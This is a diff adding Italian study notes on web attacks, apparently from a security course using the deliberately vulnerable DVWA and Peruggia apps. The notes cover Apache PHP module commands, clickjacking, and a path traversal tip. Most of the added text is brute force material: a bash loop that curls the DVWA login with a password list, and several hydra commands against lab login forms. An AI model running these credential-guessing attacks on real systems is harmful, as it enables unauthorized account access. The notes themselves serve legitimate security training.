@@ -126,10 +126,42 @@ l'applicazione lato server non analizza da dove viene la richiesta.
 
 ***NOTE IMPORTANTI***
 abilitare modulo php -->   a2enmod php7.2 
+
 disabilitare modulo php -->   a2dismod php7.2 
 
+for VARIABILE in `cat password.txt`; do echo "$VARIABILE"; done     ->  controlla per ogni riga il contenuto del file e mi stampi a video il contenuto della variabile
+
+da Owasp Zap --> strumenti/opzioni/replacer
 
 
 ***CLICKJACKING***
 la vittima apre la pagina contenente un form sul suo sito dell'attaccante. La pagina e' posizionata su una pagina con iframe e con 2 text box sopra le text-box originali.
 La vittima inserisce le credenziali e verra' reindirizzata al form corretto.
+
+***PATH TRAVERSAL***
+inserire il path "../../../../" all'interno del campo "filename" su ZAP. in questo modo navighi la directory
+
+
+***BRUTE FORCE***
+for PASSWORD in `cat password.txt`; do echo "Sto provando la password: $PASSWORD"; curl --cookie 'security=low; PHPSESSID=fdo6atckfp75hboui2pm4cf8t4' "http://192.168.236.135/DVWA/vulnerabilities/brute/?username=admin&password=$PASSWORD&Login=Login" | grep incorrect; echo; done
+
+	***TOOL***
+	hydra 	-->		hydra -l user -P passlist.txt ftp://192.168.0.1
+
+					hydra -U http-get-form
+	
+					hydra -l (METTO L'USER) -P (NOME DEL FILE CON LE PASSWORD) -t (TENTATIVI SIMULTANEI) (IP DEL SERVER) http-get-form "/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:incorrect:H=Cookie: security=low; PHPSESSID=fdo6atckfp75hboui2pm4cf8t4"
+
+					export HYDRA_PROXY_HTTP=http://localhost:8080   --> passo dal proxy
+
+	fuzzer 
+
+	***LIVELLO LOW***
+	hydra -l admin -P password.txt -t 4 192.168.236.135 http-get-form "/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:incorrect:H=Cookie: security=low; PHPSESSID=fdo6atckfp75hboui2pm4cf8t4"
+
+	***LIVELLO MEDIUM***
+	hydra -l admin -P password.txt -t 4 192.168.236.135 http-get-form "/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome:H=Cookie: security=low; PHPSESSID=fdo6atckfp75hboui2pm4cf8t4"
+
+	***PERUGGIA***
+	hydra -l admin -P password.txt 192.168.236.132 http-post-form "/peruggia/index.php?action=login&check=1:username=^USER^&password=^PASS^:S=Logout"
+
